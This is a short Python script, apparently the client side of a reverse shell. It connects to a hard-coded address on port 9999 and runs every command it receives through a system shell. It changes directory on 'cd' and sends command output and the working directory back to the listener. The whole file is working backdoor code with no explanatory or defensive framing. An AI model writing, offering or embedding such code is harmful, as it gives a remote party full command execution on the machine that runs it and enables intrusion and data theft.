import socket
import os
import subprocess

s = socket.socket()
host = '192.168.244.123'
port = 9999

s.connect((host,port))

while True:
    data = s.recv(1024)
    if data[:2].decode("UTF-8") == 'cd':
        os.chdir(data[3:].decode("UTF-8"))
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("UTF-8"),shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte , 'UTF-8')
        pwd = os.getcwd() + '>'
        s.send(str.encode(output_str + pwd))